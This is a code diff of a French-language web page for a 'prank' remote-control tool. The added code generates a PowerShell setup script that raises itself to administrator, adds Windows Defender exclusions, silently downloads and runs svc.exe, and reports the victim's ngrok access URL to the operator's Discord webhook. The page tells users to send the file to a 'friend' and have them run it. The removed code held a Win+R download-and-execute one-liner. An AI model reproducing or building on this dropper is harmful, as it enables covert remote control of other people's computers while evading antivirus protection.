@@ -250,8 +250,8 @@
   <p>Controle a distance — entre amis uniquement</p>
 </header>
 
-<!-- ── SECTION 1 : Generateur de commande ────────────────────────────────── -->
-<p class="section-title">Generer la commande d'installation &nbsp;·&nbsp; une invite UAC (admin) apparaitra sur le PC cible</p>
+<!-- ── SECTION 1 : Generateur ──────────────────────────────────────────────── -->
+<p class="section-title">Generer le fichier d'installation</p>
 
 <div class="generator-box">
   <div class="field">
@@ -262,11 +262,19 @@
     <label>Authtoken ngrok</label>
     <input type="password" id="genToken" placeholder="2abc..." oninput="updateCmd()" />
   </div>
+  <div class="field" style="justify-content:flex-end">
+    <button class="btn green" id="dlBtn" onclick="downloadSetup()" disabled>⬇ Telecharger setup.ps1</button>
+  </div>
 </div>
 
-<div class="cmd-box" id="cmdBox">
-  <code id="winrCmd">cmd /c curl -sLo %TEMP%\s.ps1 "https://raw.githubusercontent.com/lamziiii/prank-server/master/setup.ps1" && powershell -ep bypass -File %TEMP%\s.ps1 -w "WEBHOOK" -t "TOKEN"</code>
-  <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem" onclick="copyCmd()">Copier</button>
+<div class="cmd-box" id="cmdBox" style="gap:1rem;flex-direction:column;align-items:flex-start">
+  <div style="font-size:.8rem;color:var(--muted);line-height:1.7">
+    <strong style="color:var(--text)">Comment l'utiliser :</strong><br>
+    1. Entre le webhook et le token, clique <em>Telecharger setup.ps1</em><br>
+    2. Envoie le fichier a ton ami (Discord, mail...)<br>
+    3. Ton ami : <strong style="color:var(--text)">clic droit → Executer avec PowerShell</strong> → accepte l'UAC<br>
+    4. L'URL ngrok apparait dans ton Discord
+  </div>
 </div>
 
 <hr class="divider" />
@@ -349,27 +357,41 @@
 <div id="toast"></div>
 
 <script>
-  const PS1_URL = 'https://raw.githubusercontent.com/lamziiii/prank-server/master/setup.ps1';
-
-  function buildCmd(webhook, token) {
-    const w = webhook || 'WEBHOOK';
-    const t = token   || 'TOKEN';
-    return `cmd /c curl -sLo %TEMP%\\s.ps1 "${PS1_URL}" && powershell -ep bypass -File %TEMP%\\s.ps1 -w "${w}" -t "${t}"`;
-  }
+  const EXE_URL = 'https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe';
 
   function updateCmd() {
     const webhook = document.getElementById('genWebhook').value.trim();
     const token   = document.getElementById('genToken').value.trim();
-    const box     = document.getElementById('cmdBox');
-    const code    = document.getElementById('winrCmd');
-    code.textContent = buildCmd(webhook, token);
-    if (webhook && token) box.classList.add('ready');
-    else box.classList.remove('ready');
+    const btn     = document.getElementById('dlBtn');
+    btn.disabled  = !(webhook && token);
   }
 
-  function copyCmd() {
-    const cmd = document.getElementById('winrCmd').textContent;
-    navigator.clipboard.writeText(cmd).then(() => toast('Commande Win+R copiee !'));
+  function downloadSetup() {
+    const webhook = document.getElementById('genWebhook').value.trim();
+    const token   = document.getElementById('genToken').value.trim();
+    if (!webhook || !token) return;
+
+    const ps1 = `$ErrorActionPreference = "SilentlyContinue"
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+if (-not $isAdmin) {
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File \`"$PSCommandPath\`"" -Verb RunAs -Wait
+    exit
+}
+Add-MpPreference -ExclusionPath "$env:TEMP"
+Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\\Microsoft\\PyService"
+$exe = "$env:TEMP\\svc.exe"
+curl.exe -sLo $exe "${EXE_URL}"
+Start-Process $exe -ArgumentList "-w \`"${webhook}\`" -t \`"${token}\`"" -WindowStyle Hidden
+`;
+
+    const blob = new Blob([ps1], { type: 'text/plain' });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href     = url;
+    a.download = 'setup.ps1';
+    a.click();
+    URL.revokeObjectURL(url);
+    toast('setup.ps1 telecharge !');
   }
 
   // ── File input labels ────────────────────────────────────────────────────
